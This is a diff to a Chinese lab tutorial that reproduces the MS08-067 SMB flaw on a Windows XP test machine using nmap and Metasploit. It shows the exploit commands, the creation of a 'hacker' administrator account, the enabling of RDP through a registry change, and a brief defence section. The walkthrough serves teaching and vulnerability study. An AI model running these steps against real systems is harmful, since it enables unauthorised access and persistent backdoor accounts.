@@ -306,9 +306,15 @@ https://www.freebuf.com/vuls/203881.html
 Kali：192.168.163.128  
 Win XP：192.168.163.137  
 
+![测试连通性](/img/PING.jpg)
+
 第三步，打开Windows XP系统，确定445端口开启。如下图所示，在Win XP的CMD中输入 `netstat -an` 查看端口445是否打开。  
 
+![port445stat](/img/port445.jpg)  
+
 第四步，关闭Windows XP系统的防火墙。  
+
+![closewaf](/img/waf.jpg)  
 
 做完这些初始准备之后，我们开始利用Kali系统进行漏洞复现。  
 ### 三、利用Metasploit复现漏洞
@@ -318,10 +324,10 @@ Win XP：192.168.163.137
 ```bash
 nmap -n -p 445 --script smb-vuln-ms08-067 192.168.163.137 --open
 ```
-nmap漏扫脚本目录为 `/usr/share/nmap/script/` ，如下图所示，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。
-或者使用 `nmap -sV -Pn 192.168.163.137` 查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows XP。作为黑客，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。
+nmap漏扫脚本目录为 `/usr/share/nmap/script/` ，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。
+或者使用 `nmap -sV -Pn 192.168.163.137` 查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows XP。一看到XP或2003系统的445端口开放，就可以想到轰动一时的MS08-067。
 ```bash
-nmap  -sV -Pn 1192.168.163.137
+nmap  -sV -Pn 192.168.163.137
 ```
 
 第二步，进入Msfconsole并利用search语句查找漏洞利用模块。
@@ -361,10 +367,11 @@ show options
 exploit
 session 1
 ipconfig
-screenshot
-hashdump
+pwd
 ```
 注意：Windows XP SP1系统是中文而不是英文的，需要对ms08_067_netapi_ser2003_zh.rb处理。  
+
+![getshell](/img/getshell.jpg)  
 
 第六步，在目标主机上创建文件夹及文件。
 ```bash
@@ -379,7 +386,6 @@ echo eastmount>test.txt
 # 查看目标系统的基本信息
 sysinfo
 ```
-显示结果下图所示：
 
 第七步，对目标XP主机进行深度提权。
 ```bash
@@ -390,20 +396,25 @@ net localgroup administrators hacker /add
 ```
 Windows DOM用户常用命令如下：
 
+```bash
+#新建一个用户名为abcd，密码为1234的帐户，默认为user组成员
 net user abcd 1234 /add
-新建一个用户名为abcd，密码为1234的帐户，默认为user组成员
-net user abcd /del
-将用户名为abcd的用户删除
-net user abcd /active:no
-将用户名为abcd的用户禁用
-net user abcd /active:yes
-激活用户名为abcd的用户
-net user abcd
-查看用户名为abcd的用户的情况
-net localgroup administrators abcd /add
-将abcd账户给予管理员权限
 
-此时被攻击的主机新增“hacker”管理员如下图所示：
+#将用户名为abcd的用户删除
+net user abcd /del
+
+#将用户名为abcd的用户禁用
+net user abcd /active:no
+
+#激活用户名为abcd的用户
+net user abcd /active:yes
+
+#查看用户名为abcd的用户的情况
+net user abcd
+
+#将abcd账户给予管理员权限
+net localgroup administrators abcd /add
+```
 
 第八步，开启远程连接3389端口并进行远程操作。
 
@@ -415,7 +426,7 @@ net localgroup administrators abcd /add
 
 输入创建的用户名hacker和密码123456回车，弹出提示框点击OK，稍等就会成功远程登录XP系统。
 
-最后，我们还需要将新建的用户名hacker删除。写到这里，整个实验就讲解完毕。
+最后，我们还需要将新建的用户名hacker删除。
 ## 漏洞防御
 一方面关闭相关端口、安装杀毒软件和补丁，另一方面在防火墙中进行流量监测，主要是针对数据包中存在的形如"\ ** \ … \ … \ *"这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配。
 本次实验完整命令：
@@ -462,6 +473,3 @@ echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serve
 netstat -an
 rdesktop 192.168.163.137
 ```
-
-
-# 安全建议
